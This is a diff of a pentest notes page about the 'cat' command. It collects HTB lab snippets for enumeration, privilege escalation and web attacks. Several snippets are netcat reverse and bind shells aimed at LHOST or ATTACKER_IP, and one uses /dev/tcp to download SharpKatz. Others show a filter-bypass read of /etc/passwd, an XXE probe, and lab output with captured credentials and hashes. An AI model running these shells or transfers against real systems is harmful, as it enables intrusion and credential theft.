@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/cat.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=cat) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Read a specific application configuration file
+## Read a specific application configuration file
 
 **Run in:** Linux target. **Requires:** The actual readable text file and a reason to inspect its service configuration.
 
@@ -21,50 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 cat -- /opt/APP/app.conf
 ```
 
-**Read the result:** Inspect the selected file and preserve surrounding lines that give a value its meaning.
-
-**If The file contains a template or only environment-variable references:** Binary content, very large files and access-denied paths need different handling; no output can also mean an empty file.
+**What the result establishes:** Inspect the selected file and preserve surrounding lines that give a value its meaning.
 
 **Next check:** Trace the active service's configuration path and environment source; do not treat a sample setting as a confirmed credential.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://www.gnu.org/software/coreutils/manual/html_node/cat-invocation.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## cat: choose the operation and read the result
-
-Commands and examples collected from your cat notes.
-
-### What the result establishes
-
-Inspect the selected file and preserve surrounding lines that give a value its meaning.
-
-### Prerequisites and common failures
-
-Binary content, very large files and access-denied paths need different handling; no output can also mean an empty file.
-
-### Example 1: Exploitation steps
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```bash
-cd /root
-cat root.txt
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your cat notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=cat) · [All tools](/index)
 
 ## Exploitation steps
 
@@ -75,20 +40,17 @@ cd /root
 cat root.txt
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps-2)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The file contains a template or only environment-variable references | Binary content, very large files and access-denied paths need different handling; no output can also mean an empty file. |
 
 ## Notebook recipes
 
-42 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+58 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -112,47 +74,6 @@ ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Active Directory Attack Path: Worked Lab — 5. Credential hunting (Linux)](/cheatsheets/ad-attack-path-worked-example#5-credential-hunting-linux)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="4. Stage 1 — defeating the string obfuscation">
-
-### 4. Stage 1 — defeating the string obfuscation
-
-**Android Banking Trojan: Reverse-Engineering Walkthrough**
-
-```bash
-python3 deobf.py stage2_jadx/sources/io/internal/Zhibsgr.java
-cat stage2_jadx/sources/io/internal/Zhibsgr.deobf.java
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Android Banking Trojan: Reverse-Engineering Walkthrough — 4. Stage 1 — defeating the string obfuscation](/research/android-malware-walkthrough#4-stage-1-—-defeating-the-string-obfuscation)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="7. Stage 2 — discovering the real payload is still hidden">
-
-### 7. Stage 2 — discovering the real payload is still hidden
-
-**Android Banking Trojan: Reverse-Engineering Walkthrough**
-
-```bash
-# Following the chain — read one, see what it calls, repeat
-cat stage2_jadx/sources/org/core/Btblwin.java
-grep -rn "Wjpye\." stage2_jadx/sources/ --include="*.java"
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Android Banking Trojan: Reverse-Engineering Walkthrough — 7. Stage 2 — discovering the real payload is still hidden](/research/android-malware-walkthrough#7-stage-2-—-discovering-the-real-payload-is-still-hidden)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -251,6 +172,28 @@ administrator
 
 </Accordion>
 
+<Accordion title="Constructing a blocked character">
+
+### Constructing a blocked character
+
+**Command Injection**
+
+```bash
+# Bash: many PATH values begin with '/', but verify yours.
+printf '%s\n' "$PATH"
+printf '%s\n' "${PATH:0:1}"
+cat ${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Constructing a blocked character](/web/cmdi#constructing-a-blocked-character)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Brute Forcing and Password Spray">
 
 ### Brute Forcing and Password Spray
@@ -289,7 +232,31 @@ SMB = Off
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks) · [Responder — Interface and Startup — Example 6: Forced Authentication Attacks](/tools/responder#example-6-forced-authentication-attacks)
+**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Determine whether the shell is inside a container">
+
+### Determine whether the shell is inside a container
+
+**Container and Docker checks**
+
+```bash
+id
+hostname
+cat /proc/1/cgroup
+cat /proc/self/mountinfo
+ls -la /.dockerenv /run/.containerenv 2>/dev/null
+ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Container and Docker checks — Determine whether the shell is inside a container](/field/containers#determine-whether-the-shell-is-inside-a-container)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -312,6 +279,27 @@ cat /proc/self/status | grep -E 'Cap|Seccomp'
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Container and Docker checks — Linux shell — inspect context](/field/containers#linux-shell-—-inspect-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Trace a concrete boundary">
+
+### Trace a concrete boundary
+
+**Container and Docker checks**
+
+```bash
+ls -ld /MOUNT_POINT
+ls -la /MOUNT_POINT
+cat /proc/self/status
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Container and Docker checks — Trace a concrete boundary](/field/containers#trace-a-concrete-boundary)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -370,6 +358,46 @@ nameserver 172.16.5.5
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Cross-Forest Trusts - Linux — Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf](/active-directory/trusts-cross-forest-linux#adding-inlanefreight-local-information-to-/etc/resolv-conf)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Credential Stealing">
+
+### Credential Stealing
+
+**Cross-Site Scripting (XSS) — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat creds.txt
+Username: test | Password: test
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Site Scripting (XSS) — HTB Module — Credential Stealing](/web/htb/xss#credential-stealing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Session Hijacking">
+
+### Session Hijacking
+
+**Cross-Site Scripting (XSS) — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat cookies.txt 
+Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Site Scripting (XSS) — HTB Module — Session Hijacking](/web/htb/xss#session-hijacking-2)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -486,6 +514,26 @@ cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
 
 </Accordion>
 
+<Accordion title="Content-Type">
+
+### Content-Type
+
+**File Upload Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+grcic550@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — HTB Module — Content-Type](/web/htb/file-upload-attacks#content-type)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Files to Always Check">
 
 ### Files to Always Check
@@ -552,21 +600,6 @@ sudo cat /tmp/target-NFS/<folder>/file.txt
 # Unmount when done (important — stale mounts freeze your terminal)
 sudo umount -f /tmp/target-NFS
 sudo umount -l /tmp/target-NFS   # if -f doesn't work
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049) · [NFS Enumeration and Exports — Example 4: NFS (Port 2049)](/enumeration/nfs-enumeration-network-file-system#example-4-nfs-port-2049)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Footprinting: Service-by-Service Lab Workflow**
-
-Context from the notebook: Lesson learned:  NFS directory showed  drwx------  owned by  nobody  — couldn't enter as normal user.  sudo ls  and  sudo cat  solved it. Also, stale NFS mounts will freeze  ls  in that directory — always unmount when the target goes down.
-
-```text
-sudo cat
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -678,9 +711,53 @@ hashcat -m 19700 aes256_hashes wordlist.txt
 
 </Accordion>
 
-<Accordion title="Linux Authentication: PAM, passwd, and shadow">
+<Accordion title="Inspect the applicable service configuration">
 
-### Linux Authentication: PAM, passwd, and shadow
+### Inspect the applicable service configuration
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+ls -la /etc/pam.d
+cat /etc/pam.d/sshd
+cat /etc/pam.d/su
+sudo -l
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Inspect the applicable service configuration](/password-attacks/linux-authentication-process#inspect-the-applicable-service-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Separate account records, password verification and session policy">
+
+### Separate account records, password verification and session policy
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+getent passwd USERNAME
+id USERNAME
+getent group GROUP_NAME
+cat /etc/nsswitch.conf
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Separate account records, password verification and session policy](/password-attacks/linux-authentication-process#separate-account-records-password-verification-and-session-policy)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verify the relevant account and permission">
+
+### Verify the relevant account and permission
 
 **Linux Authentication: PAM, passwd, and shadow**
 
@@ -692,7 +769,7 @@ cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgz
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Existing notes and worked examples](/password-attacks/linux-authentication-process#existing-notes-and-worked-examples)
+**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Verify the relevant account and permission](/password-attacks/linux-authentication-process#verify-the-relevant-account-and-permission)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -742,6 +819,55 @@ cat /etc/cron.deny*
 
 </Accordion>
 
+<Accordion title="Establish the baseline">
+
+### Establish the baseline
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+id
+hostname
+uname -a
+cat /etc/os-release
+pwd
+printf '%s\n' "$PATH"
+sudo -l
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Establish the baseline](/privesc/linux-privesc-checklist#establish-the-baseline)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Identify processes, listeners and scheduled work">
+
+### Identify processes, listeners and scheduled work
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+ps auxww
+ss -lntup
+systemctl list-timers --all
+cat /etc/crontab
+ls -la /etc/cron.d /etc/cron.daily
+crontab -l
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Identify processes, listeners and scheduled work](/privesc/linux-privesc-checklist#identify-processes-listeners-and-scheduled-work)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Key commands">
 
 ### Key commands
@@ -757,7 +883,43 @@ cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server confi
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 6: Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#example-6-key-commands) · [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands)
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2. Linux target — connect">
+
+### 2. Linux target — connect
+
+**Linux → Kali reverse shell**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST 7777 > /tmp/f
+```
+
+</Accordion>
+
+<Accordion title="Generate Permuted Corporate Usernames (username-anarchy)">
+
+### Generate Permuted Corporate Usernames (username-anarchy)
+
+**Login Brute Forcing**
+
+```bash
+cat << 'EOF' > fullnames.txt
+Jane Doe
+John Smith
+EOF
+
+username-anarchy -i fullnames.txt > usernames.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Login Brute Forcing — Generate Permuted Corporate Usernames (username-anarchy)](/web/login-brute-forcing#generate-permuted-corporate-usernames-username-anarchy)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -815,7 +977,7 @@ sudo cat /tmp/nfs/<file>
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [NFS Enumeration and Exports — Example 3: 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#example-3-2-mount-and-browse) · [NFS Enumeration and Exports — 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#2-mount-and-browse)
+**Original note sections:** [NFS Enumeration and Exports — 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#2-mount-and-browse)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -941,6 +1103,151 @@ id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; ca
 
 </Accordion>
 
+<Accordion title="SELECT INTO OUTFILE">
+
+### SELECT INTO OUTFILE
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat /tmp/credentials 
+
+1       admin   392037dbba51f692776d6cefb6dd546d
+2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — SELECT INTO OUTFILE](/web/htb/sql-injection-fundamentals#select-into-outfile)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat /tmp/test.txt 
+
+this is a test
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — SELECT INTO OUTFILE](/web/htb/sql-injection-fundamentals#select-into-outfile)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Custom HTTP Requests">
+
+### Custom HTTP Requests
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat req.txt
+HTTP / HTTP/1.0
+Host: www.example.com
+
+{
+  "data": [{
+    "type": "articles",
+    "id": "1",
+    "attributes": {
+      "title": "Example JSON",
+      "body": "Just an example",
+      "created": "2020-05-22T14:56:29.000Z",
+      "updated": "2020-05-22T14:56:28.000Z"
+    },
+    "relationships": {
+      "author": {
+        "data": {"id": "42", "type": "user"}
+      }
+    }
+  }]
+}
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Custom HTTP Requests](/web/htb/sqlmap-essentials#custom-http-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Reading Local Files">
+
+### Reading Local Files
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Reading Local Files](/web/htb/sqlmap-essentials#reading-local-files)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Store the Traffic">
+
+### Store the Traffic
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+
+...SNIP...
+
+grcic550@htb[/htb]$ cat /tmp/traffic.txt
+HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.4.9 (http://sqlmap.org)
+Connection: close
+
+HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2020 14:12:50 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 914
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://www.example.com:80/?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Store the Traffic](/web/htb/sqlmap-essentials#store-the-traffic)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Actual Bind Shell with Netcat">
 
 ### Actual Bind Shell with Netcat
@@ -953,21 +1260,6 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> 
 
 # Attack box (client) — connect to get shell
 nc -nv <TARGET_IP> 7777
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Shells, Payloads, and Interactive TTYs — Actual Bind Shell with Netcat](/exploitation/shells-payloads-cheat-sheet#actual-bind-shell-with-netcat)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Shells, Payloads, and Interactive TTYs**
-
-Context from the notebook: cat /tmp/f Read commands from the pipe
-
-```text
-cat /tmp/f
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -995,6 +1287,95 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="1. Record the shell and its network position">
+
+### 1. Record the shell and its network position
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+id
+hostname
+pwd
+uname -a
+cat /etc/os-release
+ip -br address
+ip route
+ss -lntp
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — 1. Record the shell and its network position](/pivoting/methodology#1-record-the-shell-and-its-network-position)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Linux identity, environment, and network">
+
+### Linux identity, environment, and network
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+id
+hostname
+pwd
+uname -a
+cat /etc/os-release
+sudo -l
+ip address
+ip route
+ss -lntup
+ps aux
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — Linux identity, environment, and network](/pivoting/methodology#linux-identity-environment-and-network)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Automated OOB Exfiltration">
+
+### Automated OOB Exfiltration
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP..
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Automated OOB Exfiltration](/web/htb/web-attacks#automated-oob-exfiltration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2a. Linux web shell — connect back">
+
+### 2a. Linux web shell — connect back
+
+**Web shell → terminal**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST 443 > /tmp/f
+```
 
 </Accordion>
 
@@ -1042,42 +1423,31 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 </Accordion>
 
-<Accordion title="Setup Steps">
+<Accordion title="Send a saved XML body without shell damage">
 
-### Setup Steps
+### Send a saved XML body without shell damage
 
-**File Transfers for Linux and Windows**
+**XXE: XML External Entity Injection**
 
-Context from the notebook: Verify:   sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
-
-```text
-sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
+```bash
+BASE='http://TARGET:PORT'
+SESSION='REPLACE_WITH_CURRENT_SESSION'
+mkdir -p evidence/xxe
+cat > evidence/xxe/probe.xml <<'XML'
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY marker "XXE-PROBE-742">]>
+<root><name>&marker;</name><details>Test</details><date>2026-11-09</date></root>
+XML
+curl -sS --compressed -b "PHPSESSID=$SESSION" \
+  -H 'Content-Type: text/plain;charset=UTF-8' \
+  --data-binary @evidence/xxe/probe.xml \
+  -D evidence/xxe/response.headers -o evidence/xxe/response.body "$BASE/addEvent.php"
+rg -n 'XXE-PROBE|entity|DOCTYPE|error' evidence/xxe/response.body
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Linux">
-
-### Linux
-
-**Privilege Escalation: Choose a Checklist**
-
-Context from the notebook: cat /etc/crontab  +  ls -la /etc/cron.*  → writable script in cron → inject reverse shell
-
-```text
-cat /etc/crontab
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Privilege Escalation: Choose a Checklist — Linux](/privesc/index#linux)
+**Original note sections:** [XXE: XML External Entity Injection — Send a saved XML body without shell damage](/web/xxe#send-a-saved-xml-body-without-shell-damage)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1085,6 +1455,10 @@ cat /etc/crontab
 </Accordion>
 
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://www.gnu.org/software/coreutils/manual/html_node/cat-invocation.html)
 
 {/* VAULT_RELATED_START */}
 
@@ -1115,5 +1489,3 @@ cat /etc/crontab
 - [Attacking DNS: Module Notes](/modules/common-services/dns)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
